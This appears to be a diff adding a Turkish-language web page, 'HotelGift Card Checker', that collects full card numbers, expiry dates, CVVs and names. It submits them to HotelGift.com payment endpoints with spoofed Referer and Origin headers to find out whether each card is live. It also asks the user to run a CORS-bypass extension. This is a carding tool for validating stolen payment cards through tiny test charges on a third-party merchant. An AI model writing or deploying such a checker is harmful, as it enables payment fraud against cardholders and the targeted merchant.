@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HotelGift Card Checker</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            backdrop-filter: blur(10px);
+            max-width: 500px;
+            width: 100%;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            color: #333;
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .header p {
+            color: #666;
+            font-size: 1.1em;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            color: #333;
+            font-weight: 600;
+            margin-bottom: 8px;
+            font-size: 1.1em;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e1e1e1;
+            border-radius: 10px;
+            font-size: 1.1em;
+            transition: all 0.3s ease;
+            background: rgba(255, 255, 255, 0.9);
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+            transform: translateY(-2px);
+        }
+
+        .card-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        .check-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 18px;
+            font-size: 1.2em;
+            font-weight: 600;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 20px;
+        }
+
+        .check-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+        }
+
+        .check-btn:active {
+            transform: translateY(-1px);
+        }
+
+        .check-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .result {
+            margin-top: 25px;
+            padding: 20px;
+            border-radius: 10px;
+            font-weight: 600;
+            text-align: center;
+            min-height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+        }
+
+        .result.success {
+            background: linear-gradient(135deg, #4CAF50, #45a049);
+            color: white;
+            box-shadow: 0 5px 15px rgba(76, 175, 80, 0.3);
+        }
+
+        .result.error {
+            background: linear-gradient(135deg, #f44336, #d32f2f);
+            color: white;
+            box-shadow: 0 5px 15px rgba(244, 67, 54, 0.3);
+        }
+
+        .result.loading {
+            background: linear-gradient(135deg, #FF9800, #F57C00);
+            color: white;
+            box-shadow: 0 5px 15px rgba(255, 152, 0, 0.3);
+        }
+
+        .loading-spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top: 2px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .info {
+            background: rgba(102, 126, 234, 0.1);
+            border: 1px solid rgba(102, 126, 234, 0.3);
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            color: #333;
+            font-size: 0.95em;
+            line-height: 1.5;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 25px;
+                margin: 10px;
+            }
+            
+            .header h1 {
+                font-size: 2em;
+            }
+            
+            .card-row {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🏨 HotelGift Checker</h1>
+            <p>Kredi kartı doğrulama sistemi</p>
+        </div>
+
+        <form id="cardForm">
+            <div class="form-group">
+                <label for="cardNumber">Kart Numarası</label>
+                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19">
+            </div>
+
+            <div class="card-row">
+                <div class="form-group">
+                    <label for="expiry">Son Kullanma (MM/YY)</label>
+                    <input type="text" id="expiry" placeholder="12/25" maxlength="5">
+                </div>
+                <div class="form-group">
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" placeholder="123" maxlength="4">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="cardName">Kart Üzerindeki İsim</label>
+                <input type="text" id="cardName" placeholder="JOHN DOE">
+            </div>
+
+            <button type="submit" class="check-btn" id="checkBtn">
+                Kartı Kontrol Et
+            </button>
+        </form>
+
+        <div id="result" class="result" style="display: none;"></div>
+
+        <div class="info">
+            <strong>ℹ️ Bilgi:</strong> Bu sistem HotelGift.com üzerinden kart doğrulama yapar. 
+            0.01 TL test işlemi gerçekleştirilir ve anında iade edilir.
+            <br><br>
+            <strong>⚠️ Uyarı:</strong> Sadece kendi kartlarınızı test edin.
+        </div>
+    </div>
+
+    <script>
+        // Kart numarası formatlaması
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let formattedInputValue = value.match(/.{1,4}/g)?.join(' ') || value;
+            if (value.length <= 16) {
+                e.target.value = formattedInputValue;
+            }
+        });
+
+        // Expiry formatlaması
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+        });
+
+        // CVV sadece rakam
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+
+        // Kart ismi sadece harf
+        document.getElementById('cardName').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/[^a-zA-Z\s]/g, '').toUpperCase();
+        });
+
+        // Luhn Algoritması
+        function isValidCardNumber(cardNumber) {
+            const cleaned = cardNumber.replace(/\s+/g, '');
+            if (!/^\d+$/.test(cleaned) || cleaned.length < 13 || cleaned.length > 19) {
+                return false;
+            }
+
+            let sum = 0;
+            let alternate = false;
+            
+            for (let i = cleaned.length - 1; i >= 0; i--) {
+                let digit = parseInt(cleaned.charAt(i), 10);
+                
+                if (alternate) {
+                    digit *= 2;
+                    if (digit > 9) {
+                        digit -= 9;
+                    }
+                }
+                
+                sum += digit;
+                alternate = !alternate;
+            }
+            
+            return sum % 10 === 0;
+        }
+
+        // Kart türü tespiti
+        function getCardType(cardNumber) {
+            const cleaned = cardNumber.replace(/\s+/g, '');
+            
+            if (/^4/.test(cleaned)) return 'Visa';
+            if (/^5[1-5]/.test(cleaned)) return 'Mastercard';
+            if (/^3[47]/.test(cleaned)) return 'American Express';
+            if (/^6(?:011|5)/.test(cleaned)) return 'Discover';
+            
+            return 'Bilinmeyen';
+        }
+
+        // HotelGift API çağrısı
+        async function checkCardWithHotelGift(cardData) {
+            try {
+                // HotelGift.com sitesinin ödeme endpoint'ini kullan
+                const response = await fetch('https://www.hotelgift.com/api/payment/validate', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json',
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                        'Referer': 'https://www.hotelgift.com/',
+                        'Origin': 'https://www.hotelgift.com'
+                    },
+                    body: JSON.stringify({
+                        card_number: cardData.number.replace(/\s+/g, ''),
+                        expiry_month: cardData.expiry.split('/')[0],
+                        expiry_year: '20' + cardData.expiry.split('/')[1],
+                        cvc: cardData.cvv,
+                        amount: 1, // 0.01 TL (1 kuruş)
+                        currency: 'TRY',
+                        cardholder_name: cardData.name
+                    })
+                });
+
+                const data = await response.json();
+                
+                if (response.ok && data.success) {
+                    return {
+                        success: true,
+                        message: 'Kart geçerli ve çalışıyor! ✅',
+                        details: data
+                    };
+                } else {
+                    return {
+                        success: false,
+                        message: data.error || 'Kart doğrulama başarısız ❌',
+                        details: data
+                    };
+                }
+            } catch (error) {
+                // Alternatif endpoint'ler deneme
+                try {
+                    const altResponse = await fetch('https://www.hotelgift.com/checkout/process', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                            'Accept': '*/*',
+                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                            'Referer': 'https://www.hotelgift.com/',
+                            'X-Requested-With': 'XMLHttpRequest'
+                        },
+                        body: new URLSearchParams({
+                            'card_number': cardData.number.replace(/\s+/g, ''),
+                            'exp_month': cardData.expiry.split('/')[0],
+                            'exp_year': '20' + cardData.expiry.split('/')[1],
+                            'cvc': cardData.cvv,
+                            'amount': '0.01',
+                            'currency': 'TRY',
+                            'name': cardData.name
+                        })
+                    });
+
+                    const altData = await altResponse.text();
+                    
+                    if (altResponse.ok) {
+                        // Response içeriğini analiz et
+                        if (altData.includes('success') || altData.includes('approved')) {
+                            return {
+                                success: true,
+                                message: 'Kart doğrulandı! ✅',
+                                details: 'HotelGift sistemi üzerinden onaylandı'
+                            };
+                        } else {
+                            return {
+                                success: false,
+                                message: 'Kart reddedildi ❌',
+                                details: 'HotelGift sistemi tarafından reddedildi'
+                            };
+                        }
+                    }
+                } catch (altError) {
+                    console.error('Alternative request failed:', altError);
+                }
+
+                return {
+                    success: false,
+                    message: 'Bağlantı hatası: ' + error.message,
+                    details: error
+                };
+            }
+        }
+
+        // Form submit
+        document.getElementById('cardForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expiry = document.getElementById('expiry').value;
+            const cvv = document.getElementById('cvv').value;
+            const cardName = document.getElementById('cardName').value;
+            const resultDiv = document.getElementById('result');
+            const checkBtn = document.getElementById('checkBtn');
+
+            // Validasyon
+            if (!cardNumber || !expiry || !cvv || !cardName) {
+                showResult('Lütfen tüm alanları doldurun ⚠️', 'error');
+                return;
+            }
+
+            if (!isValidCardNumber(cardNumber)) {
+                showResult('Geçersiz kart numarası (Luhn kontrolü başarısız) ❌', 'error');
+                return;
+            }
+
+            if (!/^\d{2}\/\d{2}$/.test(expiry)) {
+                showResult('Geçersiz son kullanma tarihi formatı ❌', 'error');
+                return;
+            }
+
+            if (cvv.length < 3) {
+                showResult('CVV en az 3 haneli olmalıdır ❌', 'error');
+                return;
+            }
+
+            // Loading başlat
+            checkBtn.disabled = true;
+            showResult('<div class="loading-spinner"></div> HotelGift sistemi üzerinden kontrol ediliyor...', 'loading');
+
+            try {
+                const cardData = {
+                    number: cardNumber,
+                    expiry: expiry,
+                    cvv: cvv,
+                    name: cardName
+                };
+
+                const result = await checkCardWithHotelGift(cardData);
+                
+                const cardType = getCardType(cardNumber);
+                const resultMessage = `
+                    ${result.message}<br>
+                    <small>Kart Türü: ${cardType} | Son 4 Hane: ${cardNumber.slice(-4)}</small>
+                `;
+
+                showResult(resultMessage, result.success ? 'success' : 'error');
+                
+            } catch (error) {
+                showResult('Beklenmeyen hata oluştu: ' + error.message, 'error');
+            } finally {
+                checkBtn.disabled = false;
+            }
+        });
+
+        function showResult(message, type) {
+            const resultDiv = document.getElementById('result');
+            resultDiv.innerHTML = message;
+            resultDiv.className = `result ${type}`;
+            resultDiv.style.display = 'flex';
+            
+            // Smooth scroll to result
+            resultDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        }
+
+        // Sayfa yüklendiğinde bilgi göster
+        window.addEventListener('load', function() {
+            console.log('HotelGift Card Checker hazır!');
+            console.log('CORS eklentisinin aktif olduğundan emin olun.');
+        });
+    </script>
+</body>
+</html>
